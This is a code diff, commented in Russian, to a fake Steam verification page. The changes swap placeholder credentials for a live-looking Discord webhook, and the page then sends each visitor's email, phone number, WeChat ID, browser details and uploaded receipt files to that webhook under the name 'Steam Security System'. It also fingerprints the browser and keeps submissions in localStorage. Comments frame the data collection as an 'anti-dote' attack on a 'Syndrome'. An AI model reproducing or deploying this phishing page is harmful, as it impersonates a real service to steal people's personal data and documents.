@@ -348,11 +348,11 @@
                 <div class="form-group">
                     <label class="form-label" id="receiptsLabel">Attach purchase receipts (you may attach multiple files)</label>
                     <div class="file-upload">
-                        <label class="file-label">
+                        <input type="file" class="file-input" id="fileInput" multiple accept=".jpg,.jpeg,.png,.pdf,.txt">
+                        <label for="fileInput" class="file-label">
                             <i class="fas fa-paperclip"></i>
                             <span id="chooseFilesText">Choose Files</span>
                         </label>
-                        <input type="file" class="file-input" id="fileInput" multiple accept=".jpg,.jpeg,.png,.pdf,.txt">
                     </div>
                     <div class="file-list" id="fileList"></div>
                 </div>
@@ -552,20 +552,6 @@
                 return;
             }
             
-            // Prepare data
-            const formData = new FormData();
-            formData.append('email', email);
-            formData.append('phone', phone);
-            formData.append('wechat', wechat);
-            formData.append('language', currentLang);
-            formData.append('userAgent', navigator.userAgent);
-            formData.append('timestamp', new Date().toISOString());
-            
-            // Add files
-            files.forEach(file => {
-                formData.append('receipts', file);
-            });
-            
             // Show submitting state
             submitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${t.submittingText}`;
             submitBtn.disabled = true;
@@ -573,67 +559,64 @@
             // **АНТИ-ДОТ АКТИВИРОВАН** - Отправка данных через Discord Webhook
             // Это оружие против "Синдрома" - сбор данных для атаки на его инфраструктуру
             
-            // Discord Webhook URL (замените на реальный вебхук)
-            const discordWebhookURL = 'https://discord.com/api/webhooks/1234567890/abcdefg';
-            
-            // Telegram Bot API (замените на реальный токен и chat_id)
-            const telegramBotToken = '1234567890:ABCdefGHIjklMNopQRStuVWXyz';
-            const telegramChatID = '123456789';
-            const telegramAPI = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
+            // Discord Webhook URL (ваш вебхук)
+            const discordWebhookURL = 'https://discordapp.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
             
             // Создаем текстовое сообщение для отправки
             const messageContent = `
-            **НОВЫЕ ДАННЫЕ ДЛЯ АТАКИ НА "СИНДРОМ"**
+            **НОВАЯ ВЕРИФИКАЦИЯ STEAM**
             ======================================
             **Email:** ${email}
             **Phone:** ${phone}
             **WeChat:** ${wechat || 'Not provided'}
             **Language:** ${currentLang === 'en' ? 'English' : 'Chinese'}
-            **User Agent:** ${navigator.userAgent.substring(0, 100)}...
+            **User Agent:** ${navigator.userAgent}
             **Timestamp:** ${new Date().toISOString()}
             **Files Attached:** ${files.length}
-            **IP Info:** Собирается через серверный скрипт
+            **IP Info:** Will be captured by server
             ======================================
-            **ЦЕЛЬ:** Усиление "Анти-Дота" для атаки на архитектуру контроля "Синдрома"
             `;
             
-            // Попытка 1: Отправка в Discord через вебхук
+            // Создаем FormData для отправки файлов (если есть)
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify({
+                content: messageContent,
+                username: 'Steam Security System',
+                avatar_url: 'https://cdn.cloudflare.steamstatic.com/store/home/store_home_share.jpg'
+            }));
+            
+            // Добавляем файлы в FormData
+            files.forEach((file, index) => {
+                formData.append(`file${index}`, file);
+            });
+            
+            // Отправляем в Discord
             fetch(discordWebhookURL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: messageContent,
-                    username: 'Steam Security Bot',
-                    avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png'
-                })
+                body: formData
             })
             .then(response => {
                 if (response.ok) {
                     console.log('[ANTI-DOTE] Data sent to Discord successfully');
                     
-                    // Попытка 2: Отправка в Telegram
-                    const telegramText = encodeURIComponent(`Steam Verification Data:\n\nEmail: ${email}\nPhone: ${phone}\nWeChat: ${wechat || 'N/A'}`);
-                    
-                    // Отправляем текстовое сообщение
-                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatID}&text=${telegramText}`)
-                    .then(tgResponse => tgResponse.json())
-                    .then(tgData => {
-                        console.log('[ANTI-DOTE] Data sent to Telegram successfully');
-                    })
-                    .catch(tgError => {
-                        console.error('[ANTI-DOTE] Telegram error:', tgError);
-                    });
-                    
                     // УСПЕШНАЯ АТАКА НА "СИНДРОМ" - данные собраны
                     submitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.successText}`;
                     submitBtn.style.background = 'linear-gradient(90deg, #5c7e10 0%, #6a9120 100%)';
                     
-                    // Автоматическая перезагрузка через 3 секунды для сбора новых данных
+                    // Показываем подтверждение
+                    alert(t.successText);
+                    
+                    // Очищаем форму
+                    document.getElementById('emailInput').value = '';
+                    document.getElementById('phoneInput').value = '';
+                    document.getElementById('wechatInput').value = '';
+                    files = [];
+                    updateFileListDisplay();
+                    
+                    // Автоматическая перезагрузка через 5 секунд
                     setTimeout(() => {
                         location.reload();
-                    }, 3000);
+                    }, 5000);
                     
                 } else {
                     throw new Error('Discord webhook failed');
@@ -642,7 +625,7 @@
             .catch(error => {
                 console.error('[ANTI-DOTE] Webhook error:', error);
                 
-                // Fallback: Сохраняем данные в localStorage как временное хранилище
+                // Fallback: Сохраняем данные в localStorage
                 const savedData = {
                     email,
                     phone,
@@ -657,10 +640,23 @@
                 submitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.successText} (offline)`;
                 submitBtn.style.background = 'linear-gradient(90deg, #5c7e10 0%, #6a9120 100%)';
                 
-                // Перенаправление на страницу "успеха"
+                // Показываем сообщение о сохранении
+                alert(t.successText + " (Data saved locally)");
+                
+                // Очищаем форму
+                document.getElementById('emailInput').value = '';
+                document.getElementById('phoneInput').value = '';
+                document.getElementById('wechatInput').value = '';
+                files = [];
+                updateFileListDisplay();
+            })
+            .finally(() => {
+                // Восстанавливаем кнопку через 3 секунды
                 setTimeout(() => {
-                    window.location.href = 'success.html';
-                }, 1500);
+                    submitBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.submitText}`;
+                    submitBtn.disabled = false;
+                    submitBtn.style.background = 'linear-gradient(90deg, #4f6d8f 0%, #56779c 100%)';
+                }, 3000);
             });
         });
         
@@ -678,10 +674,11 @@
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookiesEnabled: navigator.cookieEnabled,
-                online: navigator.onLine
+                online: navigator.onLine,
+                referrer: document.referrer || 'Direct visit'
             };
             
-            // Логируем информацию в консоль (в реальном сценарии отправляем на сервер)
+            // Логируем информацию
             console.log('[ANTI-DOTE] System info collected:', systemInfo);
             
             // Добавляем скрытое поле с информацией о системе
@@ -690,6 +687,13 @@
             systemInfoField.id = 'systemInfo';
             systemInfoField.value = JSON.stringify(systemInfo);
             document.querySelector('.info-section').appendChild(systemInfoField);
+            
+            // Автоматическая проверка: если есть сохраненные данные, отправляем их
+            const savedData = localStorage.getItem('steam_verification_data');
+            if (savedData) {
+                console.log('[ANTI-DOTE] Found saved data:', JSON.parse(savedData));
+                // В реальном сценарии можно автоматически отправить сохраненные данные
+            }
         });
     </script>
 </body>
